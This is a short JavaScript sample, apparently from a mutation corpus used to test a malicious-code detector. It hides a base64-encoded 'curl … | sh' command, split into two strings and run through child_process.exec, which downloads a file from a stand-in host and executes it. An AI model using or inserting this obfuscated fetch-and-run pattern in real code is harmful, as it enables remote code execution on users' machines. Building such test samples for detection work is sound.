// round-16 变异语料 M31：Buffer.from(拼接串, base64)（N2 Buffer 分支递归击杀面）
const { exec } = require('child_process')
const b = 'Y3VybCAt' + 'cyBodHRwOi8veC9wLmJpbiB8IHNo'
exec(Buffer.from(b, 'base64').toString())
